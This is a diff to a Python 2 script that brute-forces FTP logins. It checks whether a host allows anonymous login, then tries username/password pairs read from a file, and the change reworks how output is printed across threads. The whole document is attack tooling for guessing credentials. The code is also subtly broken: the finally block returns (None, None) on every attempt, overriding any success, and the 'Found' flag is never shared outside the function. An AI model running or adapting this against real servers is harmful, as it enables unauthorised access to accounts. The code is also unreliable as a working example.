@@ -24,21 +24,27 @@ def anon_login(hostname):
     except Exception as e:
         print('\n[-] ' + str(hostname) + ' FTP Anonymous Logon Failed.')
 
+def print_msg(msg):
+        thLock.acquire()
+        print msg
+        thLock.release()
 
 def brute_login(hostname, userName, passWord,time_delay):
+    
     time.sleep(time_delay)
     try:
         ftp = ftplib.FTP(hostname)
         ftp.login(userName, passWord)
-        print('\n[*] ' + str(hostname) + ' FTP LogonSucceeded: ' + userName + '/' + passWord)
+        msg = '\n[*] ' + str(hostname) + ' FTP LogonSucceeded: ' + userName + '/' + passWord
+        print_msg(msg)
         ftp.quit()
         Found = True
         return (userName, passWord)
     except Exception, e:
         pass
     finally:
-        thLock.release()
-        print('\n[-] Could not brute force FTP credentials.'+"\n")
+        msg = '\n[-] Could not brute force FTP credentials.username is:%s'%(userName,)
+        print_msg(msg)
         return (None, None)
 
 
@@ -62,7 +68,6 @@ def run():
             print "[*] Exiting: Key Found"
             exit(0)
         for line in fp.readlines():
-            thLock.acquire()
             userName = line.split(':')[0]
             passWord = line.split(':')[1].strip('\r').strip('\n')
             print '[+] Trying: ' + userName + '/' + passWord
